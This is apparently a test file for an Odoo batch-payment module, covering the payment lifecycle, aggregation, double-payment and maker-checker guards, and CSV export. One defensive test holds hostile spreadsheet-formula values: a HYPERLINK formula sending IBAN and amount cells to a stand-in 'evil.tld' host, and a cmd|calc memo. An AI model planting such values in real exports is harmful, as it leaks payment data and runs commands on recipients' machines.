# -*- encoding: utf-8 -*-
##############################################################################
#
# ERP Heritage
# Copyright (C) 2026 (https://www.erpheritage.com.au/)
#
##############################################################################
"""
Batch payment tests.

Covers the lifecycle (draft -> confirmed -> posted), the build wizard's
aggregation behaviour (one payment per partner vs one per invoice),
the manager guard, and CSV export shape.
"""

from unittest.mock import patch

from odoo.exceptions import UserError
from odoo.tests import tagged

from odoo.addons.eh_account_base.tests.common import EhAccountIntegrationTestCase


@tagged('eh_account_batch_payment', 'integration', 'post_install', '-at_install')
class TestBatchPayment(EhAccountIntegrationTestCase):

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.Batch = cls.env['eh.batch.payment']
        cls.Wizard = cls.env['eh.batch.payment.build.wizard']

        cls.bank_journal = cls.env['account.journal'].search(
            [('type', '=', 'bank'),
             ('company_id', '=', cls.env.company.id)],
            limit=1,
        )
        if not cls.bank_journal:
            cls.bank_journal = cls.env['account.journal'].create({
                'name': 'Test Bank',
                'code': 'TBK',
                'type': 'bank',
                'company_id': cls.env.company.id,
            })

        # Promote the test user so action_post passes the manager guard.
        cls.env.user.groups_id |= cls.env.ref(
            'eh_account_base.group_eh_manager',
        )

    def _post_supplier_invoice(self, partner, amount):
        move = self.env['account.move'].create({
            'move_type': 'in_invoice',
            'partner_id': partner.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Demo line',
                'quantity': 1,
                'price_unit': amount,
                'account_id': self.account_expense.id,
            })],
        })
        move.action_post()
        return move

    # ---- lifecycle ----

    def test_create_assigns_sequence(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.assertNotEqual(batch.name, '/')
        self.assertTrue(batch.name.startswith('BATCH/'))

    def test_confirm_empty_batch_raises(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        with self.assertRaises(UserError):
            batch.action_confirm()

    def test_confirm_advances_state(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        # Drop in a draft payment to satisfy the empty-batch guard.
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.assertEqual(batch.state, 'confirmed')
        self.assertTrue(batch.confirmed_at)
        self.assertEqual(batch.confirmed_by_id, self.env.user)

    def test_cancel_blocked_when_posted(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'state': 'posted',
        })
        with self.assertRaises(UserError):
            batch.action_cancel()

    # ---- build wizard ----

    def test_build_aggregated_per_partner(self):
        """Three invoices for partner A and one for partner B should
        produce two aggregated payments.
        """
        a1 = self._post_supplier_invoice(self.partner_a, 100.0)
        a2 = self._post_supplier_invoice(self.partner_a, 200.0)
        a3 = self._post_supplier_invoice(self.partner_a, 50.0)
        b1 = self._post_supplier_invoice(self.partner_b, 300.0)

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, [a1.id, a2.id, a3.id, b1.id])],
        })
        wizard.action_build()
        self.assertEqual(len(batch.payment_ids), 2)
        partner_a_payment = batch.payment_ids.filtered(
            lambda p: p.partner_id == self.partner_a,
        )
        self.assertEqual(len(partner_a_payment), 1)
        self.assertAlmostEqual(partner_a_payment.amount, 350.0)
        partner_b_payment = batch.payment_ids.filtered(
            lambda p: p.partner_id == self.partner_b,
        )
        self.assertAlmostEqual(partner_b_payment.amount, 300.0)

    def test_build_per_invoice_no_aggregation(self):
        a1 = self._post_supplier_invoice(self.partner_a, 100.0)
        a2 = self._post_supplier_invoice(self.partner_a, 200.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': False,
            'move_ids': [(6, 0, [a1.id, a2.id])],
        })
        wizard.action_build()
        self.assertEqual(len(batch.payment_ids), 2)

    def _post_supplier_refund(self, partner, amount):
        move = self.env['account.move'].create({
            'move_type': 'in_refund',
            'partner_id': partner.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Demo refund line',
                'quantity': 1,
                'price_unit': amount,
                'account_id': self.account_expense.id,
            })],
        })
        move.action_post()
        return move

    def test_build_nets_credit_note_not_grosses(self):
        # A vendor bill of 300 and a vendor refund of 100 for the same
        # partner must net to a 200 payment, not gross up to 400. abs()-summing
        # the residuals (the old behaviour) over-pays the vendor by 2x the
        # refund.
        bill = self._post_supplier_invoice(self.partner_a, 300.0)
        refund = self._post_supplier_refund(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, [bill.id, refund.id])],
        })
        wizard.action_build()
        self.assertEqual(len(batch.payment_ids), 1)
        self.assertAlmostEqual(batch.payment_ids.amount, 200.0)

    def test_same_source_cannot_be_double_batched(self):
        # Building the same open bill into a second batch would pay the vendor
        # twice for one document; the wizard must refuse it.
        bill = self._post_supplier_invoice(self.partner_a, 500.0)
        batch1 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch1.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        }).action_build()
        self.assertEqual(len(batch1.payment_ids), 1)

        batch2 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard2 = self.Wizard.create({
            'batch_id': batch2.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        })
        with self.assertRaises(UserError):
            wizard2.action_build()

        # Once the first batch is cancelled, the bill is free to be batched.
        batch1.action_cancel()
        wizard2.action_build()
        self.assertEqual(len(batch2.payment_ids), 1)

    def test_double_batch_guard_pivots_on_live_draft_claim(self):
        """The double-batch guard must fire ONLY while the prior claim is a
        live, unposted (draft) payment - the real double-pay window. Once that
        payment leaves draft (posted, then reversed on an NSF bounce, or a
        partial settlement leaving a remainder owed), the still-owed source
        must be re-collectable through the wizard. This proves BOTH:
        (b) the original hole stays closed - a live draft claim is refused; and
        (a) the over-restriction is fixed - a non-draft prior claim no longer
        strands a bounced/partially-settled source.

        The guard carries no superuser bypass (no env.su / sudo / has_group),
        so it raises identically for any actor; the acting user's privilege
        is irrelevant to the refusal, unlike an env.su-gated write guard."""
        bill = self._post_supplier_invoice(self.partner_a, 500.0)
        batch1 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch1.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        }).action_build()
        p1 = batch1.payment_ids
        self.assertEqual(len(p1), 1)
        self.assertEqual(
            p1.state, 'draft',
            "A freshly built batch payment is a live, unposted claim.",
        )

        batch2 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-05-31',
        })
        wizard2 = self.Wizard.create({
            'batch_id': batch2.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        })

        # (b) Hole stays closed: while P1 is a live draft claim, building the
        # same bill into a second batch is refused before any payment is
        # created, so the vendor cannot be paid twice.
        with self.assertRaises(UserError):
            wizard2.action_build()
        self.assertFalse(
            batch2.payment_ids,
            "The refused build must not have created any payment.",
        )

        # (a) Over-restriction fixed: P1 leaves draft - it posted and then the
        # bank returned the file (NSF), so the bill is owed again but P1 is no
        # longer a pending claim. In Odoo 19 a posted payment is 'in_process';
        # the backport rewrites this literal to 'posted' for 16/17.
        p1.state = 'posted'
        self.assertNotEqual(p1.state, 'draft')
        # The bill's residual is still owed, so it must now re-collect.
        self.assertNotEqual(bill.amount_residual, 0.0)
        wizard2.action_build()
        self.assertEqual(
            len(batch2.payment_ids), 1,
            "A source whose only prior claim is no longer a live draft "
            "payment must be re-batchable.",
        )

    # ---- totals ----

    def test_total_amount_reflects_payment_sum(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_b.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 250.0,
            'date': '2026-04-15',
        })
        batch.invalidate_recordset()
        self.assertEqual(batch.payment_count, 2)
        self.assertAlmostEqual(batch.total_amount, 350.0)

    # ---- export ----

    def test_export_csv_returns_download_url(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
            'ref': 'INV-001',
        })
        action = batch.action_export_csv()
        self.assertEqual(action['type'], 'ir.actions.act_url')
        # The export is served through the manager-only field route, not a
        # bare /web/content/<attachment_id> URL.
        self.assertIn(
            '/web/content/eh.batch.payment/%s/export_file' % batch.id,
            action['url'],
        )
        import base64
        content = base64.b64decode(batch.export_file).decode('utf-8')
        self.assertIn(self.partner_a.display_name, content)
        self.assertIn('100.00', content)

    def test_export_attachment_is_not_public(self):
        """The exported bank-detail file must be a private field
        attachment (res_field set, public False), so /web/content does
        not serve it to ordinary users or anonymous callers."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_export_csv()
        # The attachment behind the field must carry res_field and must
        # not be public. Field attachments are excluded from the default
        # attachment search, so query with skip_res_field_check.
        attachment = self.env['ir.attachment'].with_context(
            skip_res_field_check=True,
        ).search([
            ('res_model', '=', 'eh.batch.payment'),
            ('res_id', '=', batch.id),
            ('res_field', '=', 'export_file'),
        ])
        self.assertTrue(
            attachment,
            "Export must be stored as a field attachment (res_field set).",
        )
        self.assertFalse(
            attachment.public,
            "Bank-detail export attachment must not be public.",
        )

    def test_export_csv_neutralises_formula_injection(self):
        """Free-form text columns (partner name, memo, reference, bank)
        that begin with a spreadsheet formula leader must be prefixed
        with an apostrophe so Excel/LibreOffice render them as literal
        text and cannot beacon the row's IBAN/amount on open. The
        machine-formatted amount column stays raw and parseable."""
        import base64
        import csv
        import io

        evil_name = '=HYPERLINK("http://evil.tld/x?d="&C2&D2,"ok")'
        evil_memo = '@SUM(1+1)*cmd|calc'
        attacker = self.env['res.partner'].create({'name': evil_name})

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': attacker.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
            'ref': evil_memo,
        })

        batch.action_export_csv()
        content = base64.b64decode(batch.export_file).decode('utf-8')

        reader = csv.reader(io.StringIO(content))
        rows = list(reader)
        # rows[0] is the trusted header; the payment row follows.
        data = rows[1]
        partner_cell = data[1]
        amount_cell = data[3]
        memo_cell = data[6]

        # The formula must be defused: the cell no longer starts with a
        # formula leader, and its literal value is the original prefixed
        # with a single apostrophe.
        self.assertEqual(partner_cell, "'" + evil_name)
        self.assertEqual(memo_cell, "'" + evil_memo)
        self.assertNotIn(
            partner_cell[:1], ('=', '+', '-', '@'),
            "Partner cell still begins with a formula leader.",
        )
        # The numeric amount column stays raw so the bank portal can parse
        # it (no stray apostrophe).
        self.assertEqual(amount_cell, "100.00")

    # ---- manager guard ----

    def test_post_requires_eh_manager(self):
        # Drop manager rights on the test user before posting.
        self.env.user.groups_id -= self.env.ref(
            'eh_account_base.group_eh_manager',
        )
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        with self.assertRaises(UserError):
            batch.action_post()

    def test_post_unconfirmed_batch_blocked(self):
        """Maker-checker: a draft batch that was never confirmed must
        not post, even for a manager. The confirm (maker) step is not
        skippable."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        self.assertEqual(batch.state, 'draft')
        with self.assertRaises(UserError):
            batch.action_post()
        # The batch must stay draft: no payment moved cash.
        self.assertEqual(batch.state, 'draft')

    def test_post_blocked_when_poster_is_confirmer(self):
        """Maker-checker separation of duties: the same manager who
        confirmed the batch cannot also post it. A single manager must
        not be able to act as both maker and checker."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.assertEqual(batch.confirmed_by_id, self.env.user)
        # Same user attempts to post: must be blocked.
        with self.assertRaises(UserError):
            batch.action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_post_succeeds_for_different_manager(self):
        """A different EH Accounting Manager (not the confirmer) may post
        the confirmed batch, satisfying the maker-checker control."""
        checker = self._make_checker_manager()
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.assertEqual(batch.confirmed_by_id, self.env.user)

        PaymentModel = type(self.env['account.payment'])

        def _fake_post(payment):
            payment.state = 'posted'

        # The second manager posts; different user than the confirmer.
        with patch.object(PaymentModel, 'action_post', _fake_post):
            batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')
        self.assertEqual(batch.posted_by_id, checker)

    def test_confirm_requires_eh_manager(self):
        """The maker step (confirm) is itself manager-gated."""
        self.env.user.groups_id -= self.env.ref(
            'eh_account_base.group_eh_manager',
        )
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        with self.assertRaises(UserError):
            batch.action_confirm()

    # ---- robustness: all-payments-fail must not strand the batch ----

    def _make_batch_with_one_payment(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        return batch

    def _make_checker_manager(self):
        """A second EH Accounting Manager, distinct from the confirmer,
        so posting satisfies the maker-checker separation."""
        return self.env['res.users'].create({
            'name': 'Checker Manager',
            'login': 'eh_checker_manager',
            'email': 'checker.manager@example.com',
            'groups_id': [(4, self.env.ref(
                'eh_account_base.group_eh_manager',
            ).id)],
        })

    def _lock_company_period(self, lock_date):
        """Establish a locked period as a test precondition. On Odoo 17 the
        account core refuses to *set* fiscalyear_lock_date while any draft
        payment move exists in that period (17 books the move on payment
        create; 18+ defer it to posting). We are exercising OUR batch guard,
        not core's set-time guard, so write the field at DB level to bypass
        that unrelated RedirectWarning cross-version."""
        company = self.env.company
        self.env.cr.execute(
            "UPDATE res_company SET fiscalyear_lock_date = %s WHERE id = %s",
            (lock_date, company.id),
        )
        company.invalidate_recordset(['fiscalyear_lock_date'])

    def test_all_payments_fail_keeps_batch_unposted(self):
        """If every payment fails to post, the batch must NOT move to
        posted. A posted batch with zero movements cannot be cancelled or
        reset, so it would otherwise be stranded forever."""
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        checker = self._make_checker_manager()
        PaymentModel = type(self.env['account.payment'])
        with patch.object(
            PaymentModel, 'action_post',
            side_effect=UserError("forced failure"),
        ):
            batch.with_user(checker).action_post()
        self.assertNotEqual(batch.state, 'posted')
        self.assertFalse(
            batch.payment_ids.filtered(lambda p: p.state == 'posted'),
        )

    def test_successful_post_moves_batch_to_posted(self):
        """A payment that posts successfully lands in 'in_process' (or
        'paid') in Odoo 19, never 'posted'. The batch must still recognise
        that as posted, move to 'posted', and count it."""
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        checker = self._make_checker_manager()
        PaymentModel = type(self.env['account.payment'])

        def _fake_post(payment):
            payment.state = 'posted'

        with patch.object(PaymentModel, 'action_post', _fake_post):
            batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')
        self.assertEqual(batch.posted_count, 1)

    def test_stuck_empty_posted_batch_resets_to_draft(self):
        """A posted batch with no posted payments (a previously stranded
        batch) can be returned to draft for retry."""
        batch = self._make_batch_with_one_payment()
        batch.write({'state': 'posted'})
        self.assertFalse(
            batch.payment_ids.filtered(lambda p: p.state == 'posted'),
        )
        batch.action_set_to_draft()
        self.assertEqual(batch.state, 'draft')

    # ---- fiscal lock date ----

    def test_post_blocked_into_locked_period(self):
        """A confirmed batch dated on or before the company fiscal lock
        date must be refused with a clear UserError before any payment is
        posted. Without the guard, the batch would try to book journal
        entries into a closed period."""
        if 'fiscalyear_lock_date' not in self.env['res.company']._fields:
            self.skipTest("fiscalyear_lock_date not present on this build")
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-01-31',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-01-31',
        })
        batch.action_confirm()
        # Lock the period the batch is dated into.
        self._lock_company_period('2026-03-31')
        checker = self._make_checker_manager()
        with self.assertRaises(UserError):
            batch.with_user(checker).action_post()
        # The batch must not have advanced to posted.
        self.assertEqual(batch.state, 'confirmed')

    def test_post_allowed_after_lock_date(self):
        """A batch dated strictly after the lock date still posts."""
        if 'fiscalyear_lock_date' not in self.env['res.company']._fields:
            self.skipTest("fiscalyear_lock_date not present on this build")
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-06-30',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-06-30',
        })
        batch.action_confirm()
        self._lock_company_period('2026-03-31')
        checker = self._make_checker_manager()
        PaymentModel = type(self.env['account.payment'])

        def _fake_post(payment):
            payment.state = 'posted'

        with patch.object(PaymentModel, 'action_post', _fake_post):
            batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')

    def test_reset_blocked_for_confirmed_batch(self):
        """The reset relaxation is narrow: a confirmed batch still cannot
        return to draft."""
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        self.assertEqual(batch.state, 'confirmed')
        with self.assertRaises(UserError):
            batch.action_set_to_draft()
